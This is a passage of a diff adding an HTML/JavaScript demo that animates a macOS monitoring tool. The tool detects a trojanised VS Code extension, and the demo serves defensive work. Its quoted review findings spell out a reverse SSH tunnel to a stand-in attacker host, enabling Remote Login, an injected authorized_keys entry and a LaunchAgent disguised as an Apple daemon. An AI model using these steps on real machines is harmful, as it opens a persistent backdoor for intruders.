@@ -1,0 +1,588 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=1280">
+<title>tangent watch mac demo</title>
+<!--
+  The README's demo: what `tangent watch mac --hosted` shows for two runs
+  of tangent-eval's trojanised-extension case (cases/cursor-extension), one
+  after the other: the look-alike (twin-1) and the attack (attack-1).
+
+  Every frame is drawn from a time alone, by render(t), so render.mjs can
+  take it a frame at a time. Opened in a browser it plays; ?t=12 holds one
+  moment.
+
+  What is whose:
+  - Every line tangent prints, and every banner, is made from those runs'
+    alerts.ndjson and reviews.ndjson by the same rules as
+    crates/cli/src/follow.rs: alert(), review(), tally(), progress(),
+    note(), brief() and clean(), in its colours. The judge's and the
+    reviewer's words are the runs' own, verbatim.
+  - The commands typed on the right are the case's twin.sh and attack.sh.
+    Their output is not from the runs.
+  - The two runs were separate VMs, so they are two takes here.
+  - The time is compressed, and when each line comes is the demo's: an
+    alert about 25 s after the session's last event and its review about
+    half a minute after the alert, the medians tangent-eval measured on
+    today's settings (#277). The clock in the menu bar and the `reviewing`
+    lines, every 15 s as a live watch says them, show the time passing.
+  - The runs were judged when a session was judged after a minute of quiet
+    and a review read 400 s past its alert; today's are 15 s and 10 s.
+    tangent-eval's runs of this case end the same way on them (#277), but
+    the words would differ.
+  - The dimming of a window and of older lines is the demo's, to show where
+    to look; a terminal does neither.
+-->
+<style>
+  html, body { margin: 0; padding: 0; background: #0d1020; }
+  #stage {
+    position: relative; width: 1280px; height: 720px; overflow: hidden;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+  #wall {
+    position: absolute; inset: 0;
+    background:
+      radial-gradient(900px 620px at 8% 0%, #4a67b0 0%, rgba(74,103,176,0) 62%),
+      radial-gradient(820px 600px at 100% 100%, #b2557c 0%, rgba(178,85,124,0) 62%),
+      radial-gradient(760px 520px at 78% 8%, #6a4fa6 0%, rgba(106,79,166,0) 58%),
+      radial-gradient(700px 520px at 20% 100%, #1f7a8c 0%, rgba(31,122,140,0) 60%),
+      #1c2340;
+  }
+  #menubar {
+    position: absolute; left: 0; right: 0; top: 0; height: 24px; box-sizing: border-box;
+    padding: 0 16px; display: flex; align-items: center; gap: 20px;
+    font-size: 13px; color: #1d1d1f;
+    background: rgba(240,240,245,0.72);
+    backdrop-filter: blur(24px) saturate(170%);
+    -webkit-backdrop-filter: blur(24px) saturate(170%);
+    border-bottom: 0.5px solid rgba(0,0,0,0.12);
+  }
+  #menubar b { font-weight: 700; }
+  #menubar .clock { margin-left: auto; font-variant-numeric: tabular-nums; }
+
+  .win {
+    position: absolute; top: 36px; border-radius: 10px; overflow: hidden;
+    background: rgba(30,30,32,0.97);
+    box-shadow: 0 24px 60px rgba(0,0,0,0.42), 0 0 0 0.5px rgba(0,0,0,0.7), inset 0 0 0 0.5px rgba(255,255,255,0.12);
+  }
+  .shade { position: absolute; inset: 0; background: #0b0c12; pointer-events: none; }
+  .bar {
+    position: relative; height: 28px; display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 500; color: #77777c; background: #2a2a2d;
+    border-bottom: 1px solid #111113;
+  }
+  .win.focus .bar { color: #c9c9ce; background: #323236; }
+  .lights { position: absolute; left: 12px; top: 8px; display: flex; gap: 8px; }
+  .lights i { display: block; width: 12px; height: 12px; border-radius: 50%; background: #4c4c50; }
+  .win.focus .lights i:nth-child(1) { background: #ff5f57; }
+  .win.focus .lights i:nth-child(2) { background: #febc2e; }
+  .win.focus .lights i:nth-child(3) { background: #28c840; }
+  .term {
+    position: relative; padding: 7px 12px;
+    font-family: Menlo, "SF Mono", Monaco, monospace; font-size: 14px; line-height: 18px;
+    color: #e4e4e7; white-space: pre;
+  }
+  .row { height: 18px; }
+  .prompt { color: #9fa0a6; }
+  .blue { color: #5aa3ff; font-weight: 700; }
+  .bold { font-weight: 700; }
+  .inv { background: #e4e4e7; color: #1e1e20; font-weight: 700; }
+  .cur { background: #e4e4e7; color: #1e1e20; }
+  .cur.off { background: transparent; color: inherit; }
+  .cur.hollow { background: transparent; color: inherit; box-shadow: inset 0 0 0 1px #b8b8bd; }
+  /* follow.rs's Style: dim, yellow, bold red, bold. */
+  .a-dim { color: #8b8b91; }
+  .a-yellow { color: #dcb64c; }
+  .a-red { color: #ff5f56; font-weight: 700; }
+
+  /* macOS's banner, at its own size; a newer one stacks over the older. */
+  .note {
+    position: absolute; top: 32px; right: 10px; width: 330px; box-sizing: border-box;
+    padding: 10px 13px 11px 11px; border-radius: 16px;
+    display: flex; gap: 10px; align-items: flex-start;
+    background: rgba(246,246,248,0.9);
+    backdrop-filter: blur(30px) saturate(180%);
+    -webkit-backdrop-filter: blur(30px) saturate(180%);
+    box-shadow: 0 8px 28px rgba(0,0,0,0.3), 0 0 0 0.5px rgba(0,0,0,0.16);
+    color: #1d1d1f; font-size: 13px; line-height: 17px;
+    transform-origin: 50% 100%;
+  }
+  .note img { width: 36px; height: 36px; flex: none; margin-top: 1px; filter: drop-shadow(0 1px 1.5px rgba(0,0,0,0.25)); }
+  .note .text { min-width: 0; flex: 1; }
+  .note .top { display: flex; align-items: baseline; gap: 8px; }
+  .note .title { font-weight: 700; flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .note .when { color: #86868b; font-size: 12px; }
+  .note .sub { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .note .body {
+    color: #3a3a3d; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+  }
+
+  #skip {
+    position: absolute; top: 300px; left: 50%; transform: translateX(-50%);
+    padding: 12px 26px 12px 22px; border-radius: 999px;
+    background: rgba(20,22,34,0.9); color: #ffd27a;
+    font-size: 26px; font-weight: 700; white-space: nowrap;
+    box-shadow: 0 6px 24px rgba(0,0,0,0.35), 0 0 0 0.5px rgba(255,255,255,0.14);
+  }
+  #skip svg { vertical-align: -2px; margin-right: 12px; }
+
+  #band {
+    position: absolute; left: 0; right: 0; bottom: 0; height: 84px;
+    background: linear-gradient(to top, rgba(8,10,24,0.55), rgba(8,10,24,0));
+  }
+  .cap {
+    position: absolute; left: 0; right: 0; bottom: 26px; text-align: center;
+    font-size: 24px; font-weight: 650; letter-spacing: -0.2px; color: #fff;
+    text-shadow: 0 1px 12px rgba(0,0,0,0.45);
+  }
+  .cap .ok { color: #7ee2a0; }
+  .cap .bad { color: #ff8a80; }
+  .cap .amber { color: #ffd27a; }
+  .cap .dim { color: rgba(255,255,255,0.6); font-weight: 600; }
+  #mark {
+    position: absolute; right: 18px; bottom: 14px; display: flex; align-items: center; gap: 6px;
+    color: rgba(255,255,255,0.8); font-size: 13px; font-weight: 600;
+  }
+  #mark img { width: 18px; height: 18px; }
+</style>
+</head>
+<body>
+<div id="stage">
+  <div id="wall"></div>
+  <div id="menubar">
+    <b>Terminal</b><span>Shell</span><span>Edit</span><span>View</span><span>Window</span><span>Help</span>
+    <span class="clock" id="clock"></span>
+  </div>
+  <div class="win" id="left"><div class="bar"><div class="lights"><i></i><i></i><i></i></div><span class="title"></span></div><div class="term"></div><div class="shade"></div></div>
+  <div class="win" id="right"><div class="bar"><div class="lights"><i></i><i></i><i></i></div><span class="title"></span></div><div class="term"></div><div class="shade"></div></div>
+  <div id="skip"><svg width="30" height="21" viewBox="0 0 22 16"><path d="M1 1l9 7-9 7zM11 1l9 7-9 7z" fill="#ffd27a"/></svg>Half a minute later</div>
+  <div id="notes"></div>
+  <div id="band"></div>
+  <div id="caps"></div>
+  <div id="mark"><img src="../../packs/macos/sensor/icon.svg" alt="">Tangent</div>
+</div>
+<script>
+const DURATION = 27;
+const FONT_W = 8.43, LINE_H = 18, ROWS = 30, LEFT_COLS = 72, GAP = 14, MARGIN = 24;
+
+// ---- The records ----------------------------------------------------------
+// From tangent-eval's judged runs cursor-extension-twin-1 and -attack-1:
+// each field verbatim, and only the fields follow.rs reads.
+
+const TERMINAL = '/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal';
+const VSCODE = 'com.microsoft.VSCode';
+const BTM = '/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Versions/A/Resources/backgroundtaskmanagementd';
+
+const TWIN = {
+  alerts: [{
+    ts: '2026-11-14T02:36:10.721049512Z', entry: TERMINAL, mark: 'look',
+    why: "Appending a public key to authorized_keys grants remote SSH login to this Mac, and pairing it with a public-IP lookup looks like remote-access setup. Check whether the owner meant to enable SSH access and whether sshd is on, and confirm the key in authorized_keys is one the owner recognizes.",
+  }],
+  reviews: [{
+    entry: TERMINAL, verdict: 'benign',
+    finding: "The commands were typed in the owner's Terminal on ttys000, with no agent. At 02:36:10 zsh created ~/.ssh/authorized_keys and `cat` wrote ~/.ssh/id_ed25519.pub into it. That key is this Mac's own public key, so it grants login only to someone who already holds the owner's private key. It fits the VS Code remote-ssh extension install in the same session. The `curl -s https://ifconfig.me` at 02:36:19 is a public-IP lookup that sent nothing out. The rest is routine: Homebrew installed redis and created its sh.brew.redis LaunchAgent, which is Homebrew's normal service setup. `ssh -T git@github.com` checked GitHub access. None of this matches any of the five malicious categories.",
+  }],
+};
+
+const ATTACK = {
+  alerts: [{
+    ts: '2026-11-14T02:32:10.026635696Z', entry: TERMINAL, mark: 'look',
+    why: "The extension is sideloaded from a non-marketplace host and will run code inside VS Code, so confirm the host is an expected internal source and that the package matches what the owner intended.",
+  }, {
+    ts: '2026-11-14T02:32:15.134334545Z', entry: BTM, mark: 'flag',
+    why: "This is a login item that runs a shell at login, and its name copies Apple's naming to look like a system component. Nothing in the record shows the owner or an app they chose asked for it. Check which app smd acted for, the plist's contents and its ProgramArguments, and whether the owner installed anything around this time.",
+  }, {
+    ts: '2026-11-14T02:32:02.942940000Z', entry: VSCODE, mark: 'flag',
+    why: "Remote login enabled, an SSH reverse tunnel to a hidden key, authorized_keys and a LaunchAgent created, and the chain traced to an extension helper with no prompt or owner request. Check the extension's origin, the authorized_keys contents, and the LaunchAgent plist first, and disable the tunnel and remote login.",
+  }],
+  reviews: [{
+    entry: TERMINAL, verdict: 'malicious',
+    finding: "The owner typed `curl` for acme-assist-2.1.3.vsix from ext.acme-market.example and ran `code --install-extension` at 02:32:10–14. That part is a visible, owner-chosen action. About a second later (02:32:15) the extension's code, running in the Code Helper (Plugin) process in session 351, started `bash ~/.config/.mtr`. That script runs `ssh -N -R *:0:localhost:22 -i ~/.config/.mtrk -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null tunnel@tunnel.acme-assist.example`. The same command is respawned every 60 seconds (02:33:15, 02:34:15). It is a persistent reverse SSH tunnel that exposes the Mac's SSH port to an external host, using a hidden key and with host-key checks turned off. The extension's author caused this, not the owner. This is a backdoor giving remote access to the machine.",
+    check: "Kill the ssh and `~/.config/.mtr` processes. Uninstall the acme-tools.acme-assist extension and delete ~/.config/.mtr and ~/.config/.mtrk. Check ~/.ssh/authorized_keys and sshd logs for any logins that came in through the tunnel. Check whether the extension added anything else that runs later, such as a login item or shell rc changes. Treat the Mac's SSH keys as exposed and rotate them. Find out where the owner got the vsix from.",
+  }, {
+    entry: BTM, verdict: 'malicious',
+    finding: "Session 291/351 shows a malicious VS Code extension, acme-tools.acme-assist-2.1.3 (running inside Code Helper (Plugin)), installing a backdoor. At 02:32:14.730-913 it queried ifconfig.me and api.ipify.org to learn the host's public IP. It then wrote a new key to /Users/admin/.ssh/authorized_keys (create/close at 02:32:15.059), ran systemsetup -setremotelogin on (02:32:15.061) to enable SSH, and created /Users/admin/Library/LaunchAgents/com.apple.sysstatd.plist (02:32:15.066), a login item named to look like an Apple system daemon (the btm_launch_item_add event in the alert, caused by smd on behalf of this Code Helper process). That LaunchAgent runs /bin/sh ~/.config/.mtr, which repeatedly (every ~60s, seen 3x in the window) launches ssh -N -R *:0:localhost:22 with key ~/.config/.mtrk to tunnel@tunnel.acme-assist.example, opening a persistent reverse tunnel exposing the local SSH server to an attacker-controlled host. This is trust redirected (remote login enabled, authorized_keys modified) plus something left to run later (the disguised LaunchAgent and tunnel script), caused by the acme-assist extension, not the owner.",
+    check: "Remove ~/Library/LaunchAgents/com.apple.sysstatd.plist, delete ~/.config/.mtr and ~/.config/.mtrk, disable Remote Login (systemsetup -setremotelogin off), inspect and clean ~/.ssh/authorized_keys for the added key, uninstall the acme-tools.acme-assist VS Code extension, and rotate SSH keys/credentials since remote login was exposed via a reverse tunnel to tunnel.acme-assist.example.",
+  }, {
+    entry: VSCODE, verdict: 'malicious',
+    finding: "VS Code's Code Helper (Plugin) process (session 351, pid 581), acting on behalf of the extension acme-tools.acme-assist-2.1.3 (read at 02:32:14.5xx), ran a hidden script `~/.config/.mtr` via `/bin/sh` then `/bin/bash` (02:32:15.066-15.069). Before launching it, the same helper contacted ifconfig.me and api.ipify.org (02:32:14.730/14.913) to learn the host's public IP, created `~/.ssh/authorized_keys` (02:32:15.059) and a LaunchAgent masquerading as `~/Library/LaunchAgents/com.apple.sysstatd.plist` (02:32:15.066), and ran `/usr/sbin/systemsetup -setremotelogin on` (02:32:15.061) to enable inbound SSH system-wide. The `.mtr` script then repeatedly (every 60s, looping via `sleep 60`, observed 3 times across the session window and still running at session end) launched `ssh -N -R *:0:localhost:22 -i /Users/admin/.config/.mtrk ... tunnel@tunnel.acme-assist.example`, opening a persistent reverse SSH tunnel from the Mac to an external host using a hidden private key. This was not requested by the owner (no corresponding prompt in the session) and was triggered purely by the extension loading. It combines persistence (new LaunchAgent, authorized_keys, hidden script and key under `~/.config`) with trust redirected (remote login enabled and an outbound reverse tunnel giving an external party inbound SSH access). The `~/.config/.mtr` and `~/.config/.mtrk` files no longer exist on disk and the LaunchAgent plist is not present/not readable now, so their exact contents can't be re-confirmed, but the exec log fully documents what ran.",
+    check: "Immediately disable remote login (`systemsetup -setremotelogin off`), remove/inspect `~/.ssh/authorized_keys` for the injected key, remove the LaunchAgent `~/Library/LaunchAgents/com.apple.sysstatd.plist` (unload it first with launchctl), kill any running reverse-tunnel ssh processes to tunnel.acme-assist.example, and delete/quarantine the acme-tools.acme-assist VS Code extension (version 2.1.3) and any leftover `~/.config/.mtr`/`.mtrk` files. Rotate SSH keys and check for other persistence this extension may have installed.",
+  }],
+};
+
+// How many sessions each run's judge read: the lines of its verdicts.ndjson.
+// A live watch says them a minute at a time; here each run's are one line,
+// said with its alerts.
+const CHECKED = { twin: 48, attack: 67 };
+
+// ---- follow.rs, as tangent says them -------------------------------------
+// A line is a list of runs, [text, class]; the classes are follow.rs's Style.
+
+// clean(): control characters are spaces, white space one space, and no
+// more than 600 characters.
+function clean(s) {
+  const line = s.replace(/[\u0000-\u001f\u007f-\u009f]/g, ' ').split(/\s+/).filter(Boolean).join(' ');
+  const chars = Array.from(line);
+  return chars.length > 600 ? chars.slice(0, 600).join('') + '...' : line;
+}
+// brief(): the first sentence when it is 100 characters or fewer, or else
+// the first 100.
+function brief(text) {
+  const stop = text.indexOf('. ');
+  const first = stop >= 0 ? text.slice(0, stop + 1) : text;
+  if (Array.from(first).length <= 100) return first;
+  const chars = Array.from(text);
+  return chars.length > 100 ? chars.slice(0, 100).join('').trimEnd() + '...' : text;
+}
+// when(): `03:09Z`.
+const when = ts => ts.endsWith('Z') ? `${ts.slice(11, 16)}Z` : ts;
+// subject(): the session's program, its entry's last part.
+const subject = entry => entry.split('/').pop();
+// alert(): one line while the alert waits for its review.
+const alertLine = (a, id) => [
+  [`#${id}`, 'a-dim'], ['  '], [when(a.ts), 'a-dim'], ['  '], [a.mark === 'look' ? 'look   ' : 'flagged', 'a-yellow'],
+  [`  ${subject(a.entry)}  ${brief(clean(a.why))}  `], ['(reviewing)', 'a-dim'],
+];
+// review(): one quiet line when it clears its alert, or the finding and what
+// to check, under the verdict, when it upholds it.
+function reviewLines(r, id) {
+  const tag = [[`#${id}`, 'a-dim'], ['  ']];
+  if (r.verdict === 'benign') {
+    return [[...tag, ['cleared', 'a-dim'], [`  ${subject(r.entry)}  `], [brief(clean(r.finding)), 'a-dim']]];
+  }
+  const label = { malicious: ['MALICIOUS', 'a-red'], unresolved: ['ALERT', 'a-red'] }[r.verdict] || [r.verdict.toUpperCase(), 'bold'];
+  return [
+    [],
+    [...tag, label, ['  '], [subject(r.entry), 'bold']],
+    [[`    ${clean(r.finding)}`]],
+    ...(r.check ? [[['    '], ['check:', 'bold'], [` ${clean(r.check)}`]]] : []),
+  ];
+}
+// span(): `42s`, `1m 05s`.
+const span = s => s < 60 ? `${s}s` : `${Math.floor(s / 60)}m${s % 60 ? ` ${String(s % 60).padStart(2, '0')}s` : ''}`;
+// The pipeline holds an alert this long before its review starts: the
+// macos_review plugin's expire_after_ms, which watch reads from the config.
+const HOLD = 10;
+// progress(): each alert still in review, by the seconds since it was
+// raised: the hold's countdown, then how long it has been in review.
+const progress = pending => 'reviewing ' + pending.map(([id, s]) =>
+  s < HOLD ? (HOLD - s >= 5 ? `#${id} (starts in ~${span(HOLD - s)})` : `#${id} (starting)`) : `#${id} (investigating ${span(s - HOLD)})`
+).join(', ');
+// tally(): what was judged since the last, and how the reviews are going.
+const activities = n => n === 1 ? '1 activity' : `${n} activities`;
+const tally = (count, flagged, pending) =>
+  [[`checked ${activities(count)} · ${flagged ? `${flagged} flagged` : 'all clear'}${pending.length ? ` · ${progress(pending)}` : ''}`, 'a-dim']];
+// While reviews are pending and nothing new was judged, tally() is progress() alone.
+const progressLine = pending => [[progress(pending), 'a-dim']];
+// note(): what the banner says of a review that upholds its alert.
+const noteOf = r => ({
+  title: r.verdict === 'malicious' ? 'Tangent: malicious activity' : 'Tangent: needs a look',
+  sub: r.entry,
+  body: clean(r.finding),
+});
+
+// ---- The two takes ------------------------------------------------------
+
+const PROMPT = 'admin@mac ~ % ';
+const STARTUP = [
+  '',
+  'Watching this Mac: what each program runs, opens and connects to, and what you ask Claude Code.',
+  "Claude Haiku 5.5 judges, Claude Sonnet 5.5 reviews (Anthropic's API).",
+  "Your records are sent to Anthropic's API to be judged: each session's summary, with its command lines, its paths and what you asked Claude Code. A review sends the records it queries and the files it reads.",
+  "It asks for your password once: sudo starts the sensor and macOS's tcpdump as root.",
+  'The terminal it runs in needs Full Disk Access (System Settings, Privacy & Security), and a restart after the grant.',
+  '',
+  'Each alert is said here as the judge marks it, and each review as it is written: a session',
+  "is judged five minutes at a time, or an agent's turn at its end, and an alert is",
+  'reviewed as soon as it is raised.',
+  'They are kept, with the pipeline and its lake, in /Users/admin/.local/share/tangent/mac',
+  'Runtime log: /Users/admin/.local/share/tangent/mac/watch.log (set RUST_LOG=info for verbose terminal logs).',
+  "A review that upholds an alert is a notification on this Mac too, once you allow Tangent's (--no-notify shows none).",
+  'To see it catch an attack, run `tangent simulate` in another terminal.',
+  'Ctrl-C stops it.',
+  '',
+];
+
+// Typed on the right: [command, its output].
+function typing(start, commands, prompt = PROMPT) {
+  const ev = [[start - 0.01, 'prompt', prompt]];
+  let t = start;
+  for (const [text, out = [], next = prompt] of commands) {
+    const cps = 95;
+    ev.push([t, 'type', text, cps]);
+    t += text.length / cps + 0.08;
+    ev.push([t, 'enter']);
+    t += 0.16;
+    for (const line of out) { ev.push([t, 'print', [line]]); t += 0.12; }
+    ev.push([t, 'prompt', next]);
+    t += 0.18;
+  }
+  return ev;
+}
+
+// Said once the sensor is up, after the password.
+const STARTED = 'Started. Activity will show up here.';
+
+// A `reviewing` line: [when in the demo, seconds since the alerts were
+// raised, the alerts still in review].
+const reviewing = take => take.progress.map(([at, s, ids]) => [at, 'print', [progressLine(ids.map(id => [id, s]))]]);
+
+// The look-alike: twin.sh. Its review comes 29 s after its alert.
+const T1 = { start: 0, work: 3.0, alerts: 8.3, skip: [9.0, 10.0], progress: [[9.5, 15, [1]]], reviews: [10.15], end: 12.9 };
+const TAKE1 = {
+  ...T1,
+  left: [
+    [0, 'prompt', PROMPT],
+    [0.35, 'type', 'tangent watch mac --hosted', 34],
+    [1.2, 'enter'],
+    [1.3, 'print', STARTUP],
+    [1.45, 'ask', 'Password:'],
+    [1.85, 'enter'],
+    [2.2, 'print', [STARTED]],
+    [T1.alerts, 'print', [alertLine(TWIN.alerts[0], 1)], 'alert'],
+    [T1.alerts, 'print', [tally(CHECKED.twin, 1, [[1, 0]])]],
+    ...reviewing(T1),
+    [T1.reviews[0], 'print', reviewLines(TWIN.reviews[0], 1), 'review'],
+  ],
+  right: typing(T1.work, [
+    ['cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys'],
+    ['ssh -o StrictHostKeyChecking=accept-new -T git@github.com', ["Hi admin! You've successfully authenticated, but GitHub does not provide shell access."]],
+    ['curl -s https://ifconfig.me', ['203.0.113.24{inv:%}']],
+    ['brew install redis', ['{blue:==>} {bold:Pouring redis--8.2.3.arm64_sequoia.bottle.tar.gz}', '🍺  /opt/homebrew/Cellar/redis/8.2.3: 15 files, 3.4MB']],
+    ['brew services start redis', ['{blue:==>} {bold:Successfully started `redis` (label: sh.brew.redis)}']],
+    ['code --install-extension ms-vscode-remote.remote-ssh', ['Installing extensions...', "Extension 'ms-vscode-remote.remote-ssh' was successfully installed."]],
+    ['code ~/code/acme-web'],
+  ]),
+  notes: [],
+  // The clock, in minutes past six: the twin's first command was at 6:36:10.
+  // Its alert is 25 s after its last, and its review 29 s after that.
+  clock: [[0, 35.2], [T1.work, 36.1], [T1.alerts, 37.1], [T1.skip[0], 37.12], [T1.skip[1], 37.57], [T1.end, 37.7]],
+};
+
+// The attack: attack.sh, in its own run. The reviewer takes one alert at a
+// time, so the three reviews come 29 s, 55 s and 80 s after the alerts.
+const T2 = {
+  start: 13.2, work: 13.6, alerts: 17.6, skip: [18.6, 19.6], reviews: [19.9, 20.9, 21.9], end: DURATION,
+  progress: [[19.1, 15, [1, 2, 3]], [20.25, 30, [2, 3]], [20.6, 45, [2, 3]], [21.25, 60, [3]], [21.6, 75, [3]]],
+};
+const TAKE2 = {
+  ...T2,
+  left: [
+    [T2.start - 1, 'print', [PROMPT + 'tangent watch mac --hosted', ...STARTUP, 'Password:', STARTED]],
+    ...ATTACK.alerts.map((a, i) => [T2.alerts, 'print', [alertLine(a, i + 1)], 'alert']),
+    [T2.alerts, 'print', [tally(CHECKED.attack, ATTACK.alerts.length, [[1, 0], [2, 0], [3, 0]])]],
+    ...reviewing(T2),
+    ...ATTACK.reviews.map((r, i) => [T2.reviews[i], 'print', reviewLines(r, i + 1), 'review']),
+  ],
+  right: typing(T2.work, [
+    ['cd ~/Downloads', [], 'admin@mac Downloads % '],
+    ['curl -fsSLO https://ext.acme-market.example/acme-assist-2.1.3.vsix', [], 'admin@mac Downloads % '],
+    ['code --install-extension acme-assist-2.1.3.vsix', ['Installing extensions...', "Extension 'acme-assist-2.1.3.vsix' was successfully installed."], 'admin@mac Downloads % '],
+    ['code ~/code/acme-web', [], 'admin@mac Downloads % '],
+  ], PROMPT),
+  notes: ATTACK.reviews.filter(r => r.verdict !== 'benign').map((r, i) => ({ ...noteOf(r), at: T2.reviews[i] + 0.15 })),
+  noteOut: 26.3,
+  // The extension was installed at 6:32:10 to 6:32:14.
+  clock: [[T2.start, 31.2], [T2.work, 32.1], [T2.alerts, 32.67], [T2.skip[0], 32.7], [T2.skip[1], 33.13], [T2.reviews[0], 33.15], [T2.reviews[1], 33.6], [T2.reviews[2], 34.0], [DURATION, 34.1]],
+};
+const TAKES = [TAKE1, TAKE2];
+
+const CAPTIONS = [
+  [0.3, 2.9, 'Tangent is watching this Mac'],
+  [2.9, 8.2, 'Your own setup: your SSH key, GitHub, redis, an editor extension'],
+  [8.2, 9.95, 'Its judge marks the session for a second look'],
+  [9.95, 12.9, 'The reviewer <span class="ok">clears</span> it. No notification.'],
+  [13.2, 17.5, '<span class="dim">Another run:</span> an editor extension update with a hidden backdoor'],
+  [17.5, 19.75, 'The judge flags three sessions: the editor, the terminal, a login item'],
+  [19.75, DURATION, 'All three reviewed <span class="bad">malicious</span>: each is a notification'],
+];
+const SPOTLIGHT = [[0, 'left'], [2.9, 'right'], [8.2, 'left'], [13.2, 'right'], [17.5, 'left']];
+
+// ---- Drawing ------------------------------------------------------------
+
+const esc = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+const clamp = x => Math.min(Math.max(x, 0), 1);
+const ease = x => 1 - Math.pow(1 - clamp(x), 3);
+
+// '{cls:text}' marks a run of the typed side's text with a class.
+function cells(text, cls = '', markup = true) {
+  const out = [];
+  const plain = (s, c) => { for (const ch of Array.from(s)) out.push([ch, c]); };
+  if (!markup) { plain(text, cls); return out; }
+  const re = /\{(\w+):([^}]*)\}/g;
+  let last = 0, m;
+  while ((m = re.exec(text))) { plain(text.slice(last, m.index), cls); plain(m[2], m[1]); last = re.lastIndex; }
+  plain(text.slice(last), cls);
+  return out;
+}
+
+function state(events, t, markup) {
+  const lines = [];
+  let input = null;
+  for (const [at, kind, a, b] of [...events].sort((x, y) => x[0] - y[0])) {
+    if (at > t) break;
+    if (kind === 'prompt') input = { head: cells(a, 'prompt'), full: '', typed: '', echo: true, until: 0 };
+    else if (kind === 'ask') input = { head: cells(a), full: '', typed: '', echo: false, until: 0 };
+    else if (kind === 'type') {
+      input.full = a;
+      input.typed = a.slice(0, Math.min(a.length, Math.floor((t - at) * b)));
+      input.until = at + a.length / b;
+    } else if (kind === 'enter') {
+      lines.push({ cells: input.head.concat(input.echo ? cells(input.full, '', false) : []), at });
+      input = null;
+    } else if (kind === 'print') {
+      // A line is text, or tangent's: runs of [text, class], never marked up.
+      for (const l of a) lines.push({ cells: Array.isArray(l) ? l.flatMap(([s, c = '']) => cells(s, c, false)) : cells(l, '', markup), block: b || null, at });
+    }
+  }
+  return { lines, input };
+}
+
+function rows(st, cols) {
+  const out = [];
+  const wrap = (cs, line, cursor) => {
+    for (let i = 0; i < Math.max(cs.length, 1); i += cols) out.push({ cells: cs.slice(i, i + cols), block: line.block, at: line.at });
+    if (cursor) {
+      const last = out[out.length - 1];
+      if (last.cells.length >= cols) out.push({ cells: [], cursor: true });
+      else last.cursor = true;
+    }
+  };
+  for (const l of st.lines) wrap(l.cells, l, false);
+  if (st.input) wrap(st.input.head.concat(st.input.echo ? cells(st.input.typed, '', false) : []), {}, true);
+  return out;
+}
+
+// A line is bright in the step of the story it is written in, and fades
+// when the next step begins; reviews stay bright, and alerts fade once the
+// first review comes.
+function brightness(r, t, take) {
+  if (r.at === undefined) return 1;
+  if (r.at < take.start) return 0.4;
+  if (r.block === 'review') return 1;
+  if (r.block === 'alert') return 1 - 0.55 * clamp((t - take.reviews[0] + 0.2) / 0.5);
+  const step = Math.max(...CAPTIONS.map(c => c[0]).filter(a => a <= t), 0);
+  return r.at < step ? 1 - 0.6 * ease((t - step) / 0.4) : 1;
+}
+
+function rowHTML(r, t, take, cursor) {
+  let html = '', run = '', cls = null;
+  const flush = () => { if (run) html += cls ? `<span class="${cls}">${esc(run)}</span>` : esc(run); run = ''; };
+  for (const [ch, c] of r.cells) { if (c !== cls) { flush(); cls = c; } run += ch; }
+  flush();
+  if (r.cursor) html += `<span class="cur ${cursor}"> </span>`;
+  return `<div class="row" style="opacity: ${brightness(r, t, take).toFixed(3)}">${html}</div>`;
+}
+
+function drawPane(el, events, cols, t, take, focused, title, markup) {
+  const st = state(events, t, markup);
+  const all = rows(st, cols);
+  const visible = all.slice(Math.max(0, all.length - ROWS));
+  let cursor = 'hollow';
+  if (focused) {
+    const typing = st.input && t < st.input.until + 0.5;
+    cursor = typing || Math.floor(t / 0.53) % 2 === 0 ? '' : 'off';
+  }
+  const term = el.querySelector('.term');
+  term.innerHTML = visible.map(r => rowHTML(r, t, take, cursor)).join('');
+  // A take comes in and goes out with its windows' text.
+  term.style.opacity = Math.min(take.start ? ease((t - take.start) / 0.3) : 1, take.end < DURATION ? 1 - ease((t - take.end + 0.3) / 0.3) : 1).toFixed(3);
+  el.classList.toggle('focus', focused);
+  el.querySelector('.bar .title').textContent = title;
+}
+
+// How dimmed a window is: none while it is the one to look at.
+function shade(name, t) {
+  let lit = 0;
+  for (let i = 0; i < SPOTLIGHT.length; i++) {
+    const [at, which] = SPOTLIGHT[i];
+    if (t < at) break;
+    const on = which === name ? 1 : 0;
+    const before = i === 0 ? on : (SPOTLIGHT[i - 1][1] === name ? 1 : 0);
+    lit = before + (on - before) * ease((t - at) / 0.35);
+  }
+  return 0.42 * (1 - lit);
+}
+
+const between = (t, a, b, fade = 0.25) => Math.min(ease((t - a) / fade), 1 - ease((t - b + fade) / fade));
+
+function clock(t, take) {
+  const k = take.clock;
+  let m = k[k.length - 1][1];
+  for (let i = 1; i < k.length; i++) {
+    const [t0, m0] = k[i - 1], [t1, m1] = k[i];
+    if (t <= t1) { m = m0 + (m1 - m0) * clamp((t - t0) / (t1 - t0)); break; }
+  }
+  return `Fri Nov 13  6:${String(Math.floor(m)).padStart(2, '0')} PM`;
+}
+
+const icon = '../../packs/macos/sensor/icon.svg';
+function drawNotes(take, t) {
+  const box = document.getElementById('notes');
+  const shown = take.notes.filter(n => n.at <= t);
+  box.innerHTML = shown.map((n, i) => {
+    // How many newer banners have come over it, as they come.
+    const depth = shown.slice(i + 1).reduce((d, m) => d + ease((t - m.at) / 0.3), 0);
+    if (depth > 2.5) return '';
+    const slide = Math.max(1 - ease((t - n.at) / 0.42), take.noteOut ? ease((t - take.noteOut) / 0.32) : 0);
+    const y = 10 * Math.min(depth, 2), s = 1 - 0.05 * Math.min(depth, 2);
+    const style = `z-index: ${10 + i}; transform: translate(${(slide * 360).toFixed(1)}px, ${y.toFixed(1)}px) scale(${s.toFixed(3)}); opacity: ${(1 - 0.15 * depth).toFixed(3)}`;
+    // Under a newer one, only its edge shows.
